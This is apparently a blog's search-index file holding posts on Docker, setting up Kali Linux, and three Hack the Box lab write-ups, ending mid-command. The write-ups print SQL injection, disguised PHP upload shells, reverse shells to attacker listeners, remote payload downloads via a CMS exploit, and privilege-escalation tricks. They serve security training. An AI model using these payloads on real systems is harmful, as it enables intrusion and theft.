'use strict';(function(){const indexCfg={cache:true};indexCfg.doc={id:'id',field:['title','content'],store:['title','href','section'],};const index=FlexSearch.create('balance',indexCfg);window.bookSearchIndex=index;index.add({'id':4,'href':'/posts/misc/docker-containerization-vs-virtualization/','title':"Docker - Containerization vs. Virtualization",'section':"Misc",'content':"Containers and virtual machines are used all across cloud infrastructure. Cloud providers utilizes virtualization to divvy up hardware resources so that they can maximize hardware utilization on their machines. Docker is used to develop, deploy, and ship applicaiations quickly with low overhead some isolation. Both of these technologies are vital in how we interact with the web today. We are going to dive into Docker and how containers and virtual machines are different. This type of exploration allows us to be more aware of potential security issues and be able to talk about what kind of infrastructure a modern web service may be running.\nWhat is Docker not? #  Docker is not a virtual machine. Virtual machines allow one set of hardware to run multiple operating systems by carving out resources to dedicate to each OS running. Hypervisors such as VMWare manage these virtual machines and divvy up resources. The hypervisor can run in place of the traditional operating system such that it is the only software interacting directly with the hardware (Type 1). In most cases, virtualization allows for complete isolation of environments so that OSs running on the same hardware cannot access each other\u0026rsquo;s memory spaces at all. At a high level, this is implemented by not allowing the OS running to know that more resources are available.\nFor example, the hypervisor dedicates 4GB of RAM to my Windows machine and 2GB of RAM to my Linux machine. The Windows and Linux machines do not know that there exists more RAM than they are dedicated. Why? Well, that is because all the memory and storage they have access to is virtual. It is all managed by the hypervisor.\nWhat is Docker? #  Docker is a tool, written in Go, to allow applications to run in a loosely isolated environment called a container. Simply put, a container is like OS virtualization. Whereas virtual machines are hardware virtualization, containers are like OS virtualization.\nThese containers run on top of the docker daemon, running on a host OS (ex. Ubuntu). Each container has it\u0026rsquo;s own file system, processes, and system memory. A Docker container cannot access the processes running on the host OS, and it cannot access the processes running on parallel Docker containers. Containers are self-contained; everything needed to run the application inside the container is installed, except for the kernel. If you install a website, then the backend and all the required applications will be installed. Once we create a Docker container, we can pack it up and take it anywhere. It is possible to deploy it on any system that is running Docker and shares the same kernel.\nWhy Docker? #  Docker is fast and lightweight. Each docker container is sharing the Linux kernel on the host OS, so when an application launches, the kernel does not need to start; it is already running! Docker can also help with developing microservices. You don\u0026rsquo;t need to keep developing apps repeatedly but can package and ship smaller parts of a big project. Docker also contains all its dependencies within the container. This can reduce conflicting dependencies on a machine and also makes these dependencies easy to install since they come shipped with the container. Docker containers can quickly recover from a crash and won\u0026rsquo;t affect other processes on the system. In addition, there is the added benefit of security through obscurity. Since a container cannot see processes outside of its namespace, the containers are secure, at least to some extent. We will talk more about the security of containers down the road.\nFor example, someone wants to set up websites. They can split the store application into account services, product catalog, cart server, and an order server. With Docker, we can set up containers to perform these functions then deploy them on the different servers with our websites. If we have a store and a forum website, these both need account services. To get account services running on our forum, we need to deploy our docker container that deals with account services on our servers then we have account services set up for our websites. Another use for Docker might be to keep track of a toolset. Penetration testers often have a set of tools they prefer to use. When starting up a new system or new VM, it can be a pain to install all of these tools; with Docker, it is possible to create a container with all the tools you need at the version number you want.\nHow is Docker Implemented? #  Docker is built on the power of cgroups. cgroups allow the Docker Manager to allocate specific amounts of memory, network bandwidth, CPU cycles, and more to specific processes running on the system.\nEqually as important as cgroups are namespaces. \u0026ldquo;When you run a container, Docker creates a set of namespaces for that container.\u0026rdquo; The documentation states that when a container starts, new namespaces are created! So what are these magical namespaces then? Namespaces are what allow the containers to be isolated from one another. The documentation gives the following namespaces as an example of some that the Docker Engine uses on Linux.\n The pid namespace: Process isolation (PID: Process ID). The net namespace: Managing network interfaces (NET: Networking). The ipc namespace: Managing access to IPC resources (IPC: InterProcess Communication). The mnt namespace: Managing filesystem mount points (MNT: Mount). The uts namespace: Isolating kernel and version identifiers. (UTS: Unix Timesharing System).  As we can see, there are namespaces to handle most of the tasks that the OS does. Containerization is like virtualizing the OS, not the hardware. By creating these namespaces, Docker is essentially creating a virtual OS for the application to run in. However, unlike hardware virtualization, the host OS can see the processes running inside of the container. This is because the container is sharing the host kernel. Although the host OS and the Docker container share different namespaces, the Docker processes are still running inside the host OS namespace. Namespaces put the blinds on the container. The container believes that they are the only thing that exists but does not know what lies beyond itself.\nHands-on with Docker #  You can either do this on your local machine or, like I am, in an EC2 instance. An EC2 instance is a VM hosted on AWS, and the micro-instances can be spun-up with the free membership at no cost. It also gives me a clean platform to learn about Docker in. This tutorial is for a Unix based machine. Pulling the CentOS image on a Windows machine might not work unless you are inside the Windows Subsystem for Linux.\nThe host OS I will be using is Ubuntu; the installation commands may be different if you are on another distro.\nHow to Install Docker #   First, make sure your system has the latest packages.  $ sudo apt-get update \u0026amp;\u0026amp; sudo apt-get upgrade Now that the system is up to date, we can install Docker.  $ sudo apt-get docker.io After installing Docker you need to add your current user to the Docker group so that it has permission to interact with the Docker daemon.  The docker group grants privileges equivalent to the root user. For details on how this impacts security in your system, see Docker Daemon Attack Surface.\nCreate the group.  $ sudo groupadd docker Add your user to the docker group  $ sudo usermod -aG docker $USER Logout and log back into your user to see the changes take effect.  Using Docker #  The Docker CLI uses the command docker to interact with the docker daemon. We can pull images, run containers, execute commands inside containers, and more with this command.\nFirst, let\u0026rsquo;s install an operating system using Docker. We will install the CentOS image to see how namespaces work within the context of a container. We can use the command docker pull to pull down images published on Docker Hub\n$ docker pull centos:latest $ docker run -d -t --name docker-tutorial centos After running the container, detached and run in the background. The -d flag runs the container in the background and detaches from the shell where it was spawned. If the shell closes, the container will stay alive. The -t flag allocates a pseudo-tty inside the container so that we will be able to grab a shell inside of it. docker ps allows us to see the containers that are currently running. Now that the container is running let\u0026rsquo;s jump inside of it.\n$ docker exec -it docker-tutorial bash The -it command allows us to have an interactive terminal. Now we are inside the container! We can observe how the pid namespace changes if we use the command watch \u0026quot;ps aux\u0026quot; in our container then search for the process on our host machine.\nHost OS #  CentOS Container #  As you can see, the pid of the process inside and outside the container is different. Inside the container, watch has a pid of 43, but on our host OS, the same process has the pid of 10886. Why is this? Again, namespaces! Namespaces create an entirely new process group inside the container, and the container cannot see outside of that group. The host OS, however, can see the processes running inside of the container. This proves that containers are not virtualization. They host and the container share processes!\nThis illustration represents the idea of pid namespacing. The host OS sees all the processes that it is running and that the container is running. However, the container only sees the processes running inside of it, and the container doesn\u0026rsquo;t see the true pid of the process, only the id it is given in its namespace. Another interesting thing to note about the container\u0026rsquo;s namespace is that pid 1 is given to /bin/bash in this case. Typically this pid is reserved for either the init or systemd process on a Linux machine because all other processes originated from it. In the container\u0026rsquo;s namespace, Docker assigns the first process that is run pid 1.\nAnother way to visualize the graphic above on our machine is to use the command pstree -p. pstree allows us to see all the processes running as a tree; we can see where processes forked and who their children are. With watch still running in the container, let\u0026rsquo;s execute this command.\nHost OS #  Let\u0026rsquo;s take a look at the output. We can see that watch forked from bash from the containerd-shim, which started from containerd, which was created by systemd. containerd is automatically started by the Docker daemon and \u0026ldquo;manages the complete container lifecycle of its host system.\u0026rdquo; You can learn more about containerd on its website and more about how Docker uses it in the Docker Documentation.\nWe can check the namespaces of our machine\u0026rsquo;s processes by looking in the proc folder in the root directory.\nContainer Namespaces #  The output shows us the different namespaces used by this process. If we compare this to the namespace of the shell process running on the machine, we will see a different set of namespaces.\nHost Namespace #  $$ represents the pid of the shell, and 1 is the pid of the systemd process. As you can see, the namespaces that are being used by these two processes are the same. Fascinating right? Another thing to note is that not all the namespaces are different. For example, the user namespace and the cgroup namespace are the same.\nDeploying a Docker Container #  Docker makes it very easy to deploy web applications. On my EC2 instance, I will deploy a vulnerable web application with a backend and front end in seconds. The image I am going to use is called OWASP Juice Shop.\nIf you don\u0026rsquo;t know what OWASP is, it is a nonprofit foundation that provides free and open-source security tools to the world. The Open Web Application Security Project (OWASP) also has hundreds of local chapters worldwide where members can network and learn about security.\nOWASP Juice Shop is a sophisticated and modern web application littered with security flaws. It is perfect for security training and those interested in web application security. The whole OWASP Top Ten has been incorporated into the website, making it a great place to learn about security flaws present in web applications today. Juice Shop is also available as a Docker container, making it perfect for this tutorial.\nTo get the container image, we are going to use the docker pull command again.\n$ docker pull bkimminich/juice-shop From my AWS instance, I am going to run the container and map it to port 80. If you deploy this container on an AWS instance, make sure that you have a rule that allows inbound traffic on port 80. Traffic rules are in the security settings of your instance.\n$ docker run -d -p 80:3000 bkimminich/juice-shop If you want to run the website on your local machine, the command differs just a bit.\n$ docker run --rm -p 3000:3000 bkimminich/juice-shop Now navigate to the public URL of your AWS instance. If you are doing this on your local machine, visit localhost:3000. If it all worked correctly, you should be greeted by the Juice Shop page.\nContainerization vs. Virtualization #  Virtualization and containerization are almost omnipresent technologies in web service infrastructure. When you rent a machine on AWS, Azure, GPC, or any other cloud platform provider, you are not renting the whole server and all the hardware on it; you are typically renting some of the hardware, accessible by a virtual machine. When spinning up one of these VMs on a cloud platform, you can choose whether you want Linux, Windows, Solaris, BSD, or other kinds of operating systems. This is important because these service providers want each of their users to have a completely isolated environment all to themselves, even though there might be ten other people using the same hardware.\nContainerization comes in handy when we want to deploy applications on our server. The container engine (Docker) can handle a large number of containers with ease. We could isolate different applications on our machine using virtual machines and have each application run on its operating system, but this is a very heavy process. If we choose to virtualize everything, we need to spin up different kernels, and accessing hardware is not as efficient. When using containers, we share the kernel with the host OS, and accessing hardware is quicker because we do not need to go through the guest OS, then the hypervisor, a container can jump straight from the host OS to the hardware. This reduces overhead and, in addition to sharing the kernel, makes containers a much lighter weight and faster way to isolate applications.\nIf an application crashes or fails inside of a container, the container can just be rebooted. Restarting a container is much less costly and much quicker than rebooting a VM because the kernel does not need to be reinitialized.\nHowever, containerization does not come at a cost. Because of the shared kernel space, containerized applications can only run on the kernels they were built on. That being said, a container built on Windows probably might have issues running on Ubuntu. This also means that containers are vulnerable to kernel-level exploits. Once a container is broken out of the attacker has free reign on the host OS. Including all the other containers running on that system.\nThe security of a container highly depends on the security configuration of the host machine. For example, make sure the Docker daemon can only be controlled by trusted users and not any user on the machine. The Docker documentation also recommends that any server running Docker containers should exclusively run applications in containers, except for admin tools like SSH and logging tools.\nAttribution #  I used a lot of resources to compose this post. Including the resources listed below, I am incredibly thankful for LiveOverflow. His video about Docker proved to be priceless resources when learning about the implementation, and the hands-on part of this post is based directly on his video about namespaces. Another invaluable resource was the NetworkChuck. His video highlighting the differences between virtualization and containerization helped me grasp many of the nuances between the two.\nI ended up reading a lot of Docker documentation to come up with this, and it makes me remember how great good documentation of a tool is. It is great to see that the documents mentioned the underlying technologies, and it offered a wealth of information about where to look next.\nIf you are interested you can checkout the slides I prepared for this presentation here.\nWorks Cited #  \u0026ldquo;Docker Overview.\u0026rdquo; Docker Documentation, 6 Nov. 2020, docs.docker.com/get-started/overview/.\nKerrisk, Michael. \u0026ldquo;Namespaces in Operation, Part 1: Namespaces Overview.\u0026rdquo; LWN.net, 4 Jan. 2013, lwn.net/Articles/531114/.\nPollock, Antonia. Virtualization vs. Containerization. 16 Sept. 2020, www.liquidweb.com/kb/virtualization-vs-containerization/.\n"});index.add({'id':6,'href':'/posts/misc/virtualbox-tutorial/','title':"How to Install Kali Linux on VirtualBox",'section':"Misc",'content':"Virtual machines are super useful! They allow users to create isolated environments for testing, running software that the host machine can\u0026rsquo;t, privacy reasons, and many more. At UGASCS we mainly use VMs to host all of the tools we need for CTFs and other cyber events. Most of us use a Linux distro called Kali Linux. Kali Linux is maintained by a company called Offensive Security who specialize in offsec training materials and certifications, you may have heard about the OSCP, ya that\u0026rsquo;s them. Kali also come with tons of great tools preinstalled, guaranteed (most of the time) to work with ease. It is helpful to have a VM to prevent clutter on our host machine and also a lot of the tools we are going to be using were developed for the Linux environment.\nOkay, now that you know why we use virtual machines, let\u0026rsquo;s move forward with how to set one up. First off take a look at the prerequisites and the system requirements below. After you download the required files come back here and continue the tutorial.\nPrerequisites and System Requirements #   Kali Linux 64-Bit (Installer) VirtualBox and Extension Pack 4GB of RAM 30 GB of free storage space  Now that you have downloaded all the required software, go ahead and install VirtualBox and when it asks you to install the extension pack do so as well. If you are not prompted to install the extensions see How to Install Extensions Pack otherwise skip this step to How to Add a New Guest Machine.\nHow to Install Extensions Pack #  First click on the Preferences button at the top of the Tools window.\nAfter clicking on Preferences button a new window should pop up that has an extensions tab to click on.\nNext, click on the rounded blue square on the right side with the green + in it.\nNow navigate to the location of your navigation pack, select it, click install, and agree to the terms of service. You should get a message saying that the extension pack was successfully installed and it should show up in the extensions tab.\nHow to Add a New Guest Machine #  Great, so you have VirtualBox downloaded and the extension pack added! Now let\u0026rsquo;s get the a guest machine installed. For this you will be using the Kali Linux .iso you downloaded earlier.\nStart off be selecting New in the Tools tab.\nOnce the Create Virtual Machine window pops up you need to name our machine, select it\u0026rsquo;s OS type, and version. You can name your new VM whatever you want however, the type is Linux, and the version is Debian (64-Bit).\nNext, you need to allocate memory to the VM, this RAM will only be used by the VM when it is on, not all the time. The system requirements for Kali Linux have a minimum of 1GB of RAM however this might cause your VM experience to be a little less than desirable. 2GB or more is recommended, however 4GB is a very good amount.\nIn the next menu, select Create a virtual hard disk now, then VDI (Virtual Disk Image) in the next menu. Next, if you only want the VM to use the space you allocate as it needs select Dynamically allocates, otherwise the disk space will be reserved on creation with Fixed size. After selecting a storage mode we are greeted with a menu to allocate storage to our virtual machine. Kali requires at least 20GB of space for the install, however if you install it with all of the tools, you are better of to go with 40GB or more so that you have space for the files you put on there.\nFinally hit create! Great we did it\u0026hellip; almost. Click on the Settings button inside of the VM you just created.\nInside of the settings navigate to the Storage tab. Then click the disk with the green + in it next to Controller: IDE and click Add in the new popup window to add the Kali Linux .iso.\nNow that we have added the .iso, navigate to the Display tab and max out the Video Memory to 128MB.\nFinally if you have a 4 core or more processor go to the System tab then to the Processor tab and increase the number of CPU cores dedicated to the VM to 2. This will make the overall VM run smoother.\nHit OK to save the changes and you are done! You have successfully set up the guest machine. The last step is to set up Kali then you are done! Just start the machine and run through the installer!\n"});index.add({'id':7,'href':'/posts/hack-the-box/magic/','title':"Magic",'section':"Hack the Box",'content':"This box was really cool for a few reasons. First off we bypass authentication using one of the OWASP Top 10, then continue to upload a reverse shell by tricking the web server into believing we are uploading a .png file. This is done through some file manipulation and double extensions. To get user we needed to dump a database and for root we hijacked the command flow. Really fun and challenging!\nTools #   nmap ffuf Burp Suite msfvenom python3 mysql  Recon #  If we do an nmap, sudo nmap -sS -sV magic.htb -oA nmap/magic we can see that there are only two services, SSH and a web server. Now that we know there is a web server I am going to work on enumerating the domain using ffuf. The command I used is ffuf -u http://magic.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .txt,.html,.xml,.php -o ffuf/magic I used some common extensions in hope of finding some interesting files. It looks like most of the stuff running is .php.\nMy scans did not show up much so I decided to try my hand at the login page. Inspecting the source code did not turn up much however I noticed that I did get the error message when using the character '. This is a sign for SQL injection. However I was not allowed to type spaces in the login box so I opened up Burp Suite and turned intercept on. When submitting the form page I entered my URL encoded payload for the username. My payload was ' OR 1=1-- then I URL encoded it to %27%20or%201%3D1--. After executing this payload we make it to the upload page. We can create a reverse shell payload. I am going to try and craft a php payload because I know the website will execute php.\nOkay so after a few hours of trial and error I figured out that we can craft the payload using this command msfvenom -p php/reverse_php LHOST=10.10.14.2 LPORT=1337 -f raw \u0026gt; shell.php. However we cannot just upload this file because the server requires the file type to be .jpg, .jpeg, or .png. Try changing the file name to shell.png, maybe that will work. Nope they check for that too\u0026hellip; however if we add the magic bytes of a .png file to the shell then we can upload it. To add these bytes use the following command printf \u0026quot;�PNG \u001a \u0026quot; | cat - shell.php \u0026gt; shell.png. We can then open up our listener with the command nc -lvnp 1337, then navigate to the file on the website at http://magic.htb/images/uploads/shell.png. If we inspect our listener we notice nothing is happening. Hmm what is going on. Well the web server has no reason to run a .png file. However if we name the file shell.php.png then the webserver will run it and it has the required file extension to pass the upload. Try crafting the payload again with the two extensions. Use the command printf \u0026quot;�PNG \u001a \u0026quot; | cat - shell.php \u0026gt; shell.php.png. Then if we navigate to the image, here http://magic.htb/images/uploads/shell.php.png, we should see something return on our listener. I tried upgrading the shell with python -c 'import pty; pty.spawn(\u0026quot;/bin/sh\u0026quot;)' however nothing happened. I even tried to use python3, then the shell hung. It looks like we are just going to have to use the weakish shell. Oh well.\nUser #  Now that we are on the server we can begin to investigating the www-data directory. I found a file called db.php5. When I cated this file out I found the following information:\nprivate static $dbName = 'Magic' ; private static $dbHost = 'localhost' ; private static $dbUsername = 'theseus'; private static $dbUserPassword = 'iamkingtheseus'; Let\u0026rsquo;s see if we can use these credentials to ssh into the user theseus. Oops doesn\u0026rsquo;t look like it. But I should be able to use su. If only my reverse shell would stop dying. Doesn\u0026rsquo;t look like su is working either, and I could not get a stable shell to work unfortunately. However I just thought of a way to maybe get a stable reverse shell. I successfully exfiltrated a list of readable files by spawning a simple http server using the command python3 -m http.server in our weak shell. This gave me the idea to maybe spawn another reverse shell. Use the command python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\u0026quot;10.10.14.2\u0026quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026quot;/bin/sh\u0026quot;,\u0026quot;-i\u0026quot;]);' in our weak instance and start to listen on port 1234 on your machine. Of course replace the IP address with your own internal IP. Now we have such a better shell, make sure you upgrade it using python3 -c 'import pty; pty.spawn(\u0026quot;/bin/sh\u0026quot;)'! Now we can see when we try to use the su command that we do not have the correct password. Well maybe there is something else on this machine that will use the password, like maybe the database that it corresponds too. So I was right. I could not find any database on the server, but with the command mysqldump we can use the credentials we found to dump the database because we have all the information we need. If I use the command mysqldump -h localhost -u theseus -p Magic \u0026gt; db_backup.sql, then we have created a plain text dump of the database. In here we find the following credentials:\nadmin::Th3s3usW4sK1ng Turns out if we do su and use the password we are now the user theseus! What a relief to get user finally. Now onto the big goal.\nRoot #  Okay so I got linPEAS onto the machine and saw a file named /bin/sysinfo. At first I didn\u0026rsquo;t know what to do because honestly that sounds like something that ships with the machine. However after some more research I found a CVE for it. unfortunately this didn\u0026rsquo;t work because we are missing the .mcsiwrapper. So I continued to enumerate the machine for some time and was fixated for a while on the command /sbin/init. This does ship with the machine and isn\u0026rsquo;t our target. I then ran suid3num which tells us which SUID scripts do not ship with the machine. This brought me back to sysinfo and decided to run strings on it. Turns out it does run escalated privileges, and it also uses a few commands, such as fdisk and lshw. If we were to maybe define our own version of one of these commands maybe we could execute some code as a privileged user. Here is how I crafted my payload.\ntheseus@ubuntu:~# cd /tmp theseus@ubuntu:/tmp# touch fdisk theseus@ubuntu:/tmp# chmod 777 fdisk theseus@ubuntu:/tmp# export PATH=/tmp:$PATH theseus@ubuntu:/tmp# echo bash \u0026gt; fdisk theseus@ubuntu:/tmp# sysinfo Okay so what is going on here? Well first we are moving to the /tmp directory and creating a file named fdisk. This is because we know that sysinfo uses a command called fdisk. Then we change the permissions of fdisk so that it can be executed. Next we need to prioritize the /tmp directory in out PATH so when sysinfo is looking for the location of fdisk it runs into our version first. Finally I echo the command I want to run into the fdisk file and then call sysinfo. Once we run sysinfo we spawn into a shell, but we cannot do anything, so then I created another reverse shell with the command python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\u0026quot;10.10.14.2\u0026quot;,1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026quot;/bin/bash\u0026quot;,\u0026quot;-i\u0026quot;]);'. I tried placing this command inside my fdisk file, but it would not execute for some reason. But now we are root! Congratulations, my first medium box is complete!\nroot@ubuntu:~# whoami root root@ubuntu:~# id uid=0(root) gid=0(root) groups=0(root),100(users),1000(theseus) root@ubuntu:~# ifconfig | grep 10.10.10.185 inet 10.10.10.185 netmask 255.255.255.0 broadcast 10.10.10.255 root@ubuntu:~# hostname ubuntu "});index.add({'id':8,'href':'/posts/hack-the-box/remote/','title':"Remote",'section':"Hack the Box",'content':"Remote was a very cool windows box that required us to discover a vulnerability in their CMS, after discovering an exposed file system that contained a backup. Once on the machine we can find out that there are some misconfigured privileges. We can then abuse those permission with PowerUp.ps1 for Windows.\nTools #   nmap python3 rpcbind mount winPEAS  Recon #  export IP=10.10.10.180 First things first, we need to do a nmap scan with the command nmap -sS -sV -oA nmap/remote $IP. Here are my results.\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-05 01:28 EDT Nmap scan report for 10.10.10.180 Host is up (0.056s latency). Not shown: 993 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 111/tcp open rpcbind 2-4 (RPC #100000) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 2049/tcp open mountd 1-3 (RPC #100005) Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 86.97 seconds Looks like there is a website being hosted on this box, so let\u0026rsquo;s check that out. After poking around the website I found a login page that was linked to on the contact page.\nLogin Page:\n http://10.10.10.180/umbraco/#/login/false?returnPath=%252Fforms http://10.10.10.180/install  This link also tells us something about the website. They are using umbraco for their CMS. If we could find the version number maybe there is some sort of exploit.\nAfter poking around the source of the login page, nothing stood out to me off the bat, so I am going to try and fuzz some directories. I am using ffuf to discover directories. I used the command ffuf -u http://$IP/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .txt,.php,.html,.json,.xml. Interesting enough there is a directory called install that redirects you to the login page.\nLet\u0026rsquo;s try to enumerate the /umbraco/ directory to see if we find anything interesting.\nThe only thing I found that I could see was a path to /umbraco/application after investigating this there doesn\u0026rsquo;t seem like much. I am going to try and research some of the other services running on the machine to maybe poke around in.\nI am going to try scanning the rpcbind service with the command nmap -sV --script=nfs-showmount 10.10.10.180 maybe there is some sort of file system that we can mount and view. Looks like there is a discoverable file system called /site_backups. Hmm this is interesting, maybe we can find credentials on that. Let\u0026rsquo;s figure out how to access it. Okay so to mount the file system I used the command sudo mount -t nfs 10.10.10.180:/site_backups /mnt. Now we can see the contents of /site_backups in our /mnt folder. Let\u0026rsquo;s do some exploring. After looking around it looks like this is a backup of the CMS umbraco so I did some googling and it looks like all the credentials are located in a database, so let\u0026rsquo;s see if that was backed up or not. After some more searching I found this fourm post about the database location being in Umbraco/AppData/umbraco.sdf. So I used the command find /mnt | grep -i '.sdf' and found the file. When I try and cat it out it is a mess and since some of the data is binary I cannot grep it, but I can use the command strings /mnt/App_Data/umbraco.sdf to see just the ascii readable characters. Then I grep for \u0026lsquo;admin\u0026rsquo; and noticed some hashes at the top. I went to crackstation and it turns out that the admin password is baconandcheese. If we try an login with the credentials admin@htb.local::baconandcheese we can get into the admin page.\nCredentials: - Umbraco Admin admin@htb.local::baconandcheese User #  I poked around the admin panel for a little bit I didn\u0026rsquo;t find anything too interesting to me, but I did find out that this host is running Umbraco version 7.12.4, and it turns out there is an authenticated remote code execution exploit for this very version! What a coincidence! Here is the code now we just need to craft a reverse shell for the windows machine. I used the command msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f exe \u0026gt; reverse.exe to create a reverse shell payload. Now we just need to get it on the target machine. We can start a server on our own machine using the command python3 -c http.server. Now we are hosting a server that our payload is on. When I use the command python3 exploit.py -u 'admin@htb.local' -p 'baconandcheese' -i 'http://10.10.10.180' -c powershell.exe -a '-NoProfile -Command curl -UseBasicParsing -o C:\\Users\\Public\\Documents\\reverse.exe http://10.10.14.5:8000/Umbraco-RCE/reverse.exe' I am getting a 200 code on my simple server, suggesting that the file has been downloaded, or at least accessed. We can check if we use the command python3 exploit.py -u 'admin@htb.local' -p 'baconandcheese' -i 'http://10.10.10.180' -c powershell.exe -a '-NoProfile -Command Get-ChildItem -Path C:\\ -Filter reverse.exe -Recurse -ErrorAction SilentlyContinue -Force'. This command will find the file on the system and should return the file and it\u0026rsquo;s read/write permissions.\nNow that we have our payload uploaded to the server we can start a listener on our machine using the command nc -lvnp 1337 and run the command python3 exploit.py -u 'admin@htb.local' -p 'baconandcheese' -i 'http://10.10.10.180' -c powershell.exe -a '-NoProfile -Command C:\\Users\\Public\\Documents\\reverse.exe' to run the reverse shell on the machine. If we take a look at our listener we should see the shell pop up. If we take a look around we can find user.txt at the path C:\\Users\\Public\\user.txt. You can read the file with the type command.\nRoot #  Time to look for some avenues for privilege escalation. The first thing I ran is whoami /priv and got the following.\nPRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======== SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeAuditPrivilege Generate security audits Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled * SeImpersonatePrivilege Impersonate a client after authentication Enabled * SeCreateGlobalPrivilege Create global objects Enabled * SeIncreaseWorkingSetPrivilege Increase a process working set Disabled I put stars near the permissions that stood out to me. The most interesting thing to me is SeImpersonatePrivilege. This sounds like I should be able to impersonate the ns authority user.\nI did a winPEAS scan. Getting it to work on the machine was kinda tricky because something was wrong with the version I had. Anyways I got the binary from here. Then I spawned a simple server on my machine and used the command curl -o winPEASany.exe http://10.10.14.5:8000/winPEASany.exe. Then I ran the program.\nOkay so now I am running another check. I am using PowerUp.ps1 to check the system. This was a bit hard to get working, but I found a good tutorial here. Make sure you follow it step by step, and I got it on the server in the usual way by using a simple python server. After running it it looks like the UsoSvc service is vulnerable, maybe I can craft another reverse shell payload and execute it as ns authority.\nOkay here is how I did it, After discovering the UsoSvc I continued to read the PowerUp article and read that you can execute commands as a privileged user. For our instance we use the command Invoke-ServiceAbuse -Name 'UsoSvc' -Command \u0026quot;[command_here]\u0026quot;. If we upload another reverse shell to the server on another port then we can spawn a reverse shell as ns authority. I used the following command to craft a payload msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=1234 -f exe \u0026gt; root_reverse.exe then to get it on the server I created another simple server. Then open up a listener on port 1234. After the file is on the server run the shell using Invoke-ServiceAbuse -Name 'UsoSvc' -Command \u0026quot;C:\\Users\\Public oot_reverse.exe\u0026quot;. Then we can catch the shell and we are ns authority! The flag can be found on the admin\u0026rsquo;s desktop. This was a pretty hard box for me. I am not that familiar with windows services, but I am glad I took on the challenge.\n"});index.add({'id':9,'href':'/posts/hack-the-box/traceback/','title':"Traceback",'section':"Hack the Box",'content':"This machine was challenging, but I learned a lot. I learned how to make \u0026ldquo;smarter\u0026rdquo; shells and how to upload the pspy script to a remote server. I wonder if I could have completed this machine without adding my public ssh key, because at the moment it is very identifiable. It was a good box tho. I look forward to my next one.\nTools #   nmap smevk.php lua ssh  Recon #  First things first, let\u0026rsquo;s run our nmap scan. I used the command sudo nmap -sS -sV -p- traceback.htb.\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-24 00:33 EDT Nmap scan report for traceback.htb (10.10.10.181) Host is up (0.12s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 860.02 seconds As usual with a htb machine there is a website being hosted, and it looks like the machine is pwned already. If we view the page source we can see the comment \u0026lt;!--Some of the best web shells that you might need ;)--\u0026gt;, so there might be a web shell some where. I am going to do a ffuf scan on the domain. The command I used is ffuf -u http://traceback.htb/FUZZ -w /usr/share/dirb/wordlists/big.txt -e .html,.txt,.php,.xml.\nThat did not teach us anything new, but after googling some stuff about the author\u0026hellip; considering that he signed the first page of the web site I found a repository that he forked called Web-Shells. So I created a wordlist with the files in that repo and after running the command ffuf -u http://traceback.htb/FUZZ -w web_shell_wordlist.txt, ffuf found the shell smevk.php, unfortunately it is locked behind a login screen.\nUser #  If we take a look at the source code for this shell in the GitHub repo we can see that the default credentials are admin::admin. If we try them they work! Awesome so we got into the web shell.\nOnce we are in there is a field where we can execute a command. So let\u0026rsquo;s create a reverse shell. First on our attacking machine use the command nc -lvnp 1234, then I used a php reverse shell because I know the server can run php. Here is the code I ran on the web shell php -r '$sock=fsockopen(\u0026quot;10.10.14.100\u0026quot;,1234);exec(\u0026quot;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026quot;);'. Change the IP address to what is on the IPv4 section on the access page on the HTB web site.\nIn our shell we are the user webadmin, let\u0026rsquo;s navigate to this user\u0026rsquo;s home directory by using the command cd /home/webadmin. In here we see a note file that reads:\n- sysadmin - I have left a tool to practice Lua. I'm sure you know where to find it. Contact me if you have any question. I found it by using sudo -l. It seems there is a file called /home/sysadmin/luvit that we should be able to run. After a quick google search it turns out that luvit can be used to run lua scripts.\nUser webadmin may run the following commands on traceback: (sysadmin) NOPASSWD: /home/sysadmin/luvit We can get some code to spawn another shell from here. We can create the script by echoing the content of the script into a file in the /tmp directory then running the script with sudo -u sysadmin /home/sysadmin/luvit script.lua. Because when we did sudo -l we found out that we can run luvit as sysadmin without a password. Okay so here is what I did step by step:\nFirst I navigated to the /tmp directory, then I echoed the following code into a file called script.lua.\nos.execute(\u0026quot;/bin/sh\u0026quot;) Then I executed the command sudo -u sysadmin /home/sysadmin/luvit script.lua. This throws us into another shell if we run whoami then we are the sysadmin user. But it is not that good looking, so let\u0026rsquo;s try and make a new reverse shell from this user. I just used to command nc -lvnp 9999 on my attacking machine then used the command php -r '$sock=fsockopen(\u0026quot;10.10.14.100\u0026quot;,9999);exec(\u0026quot;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 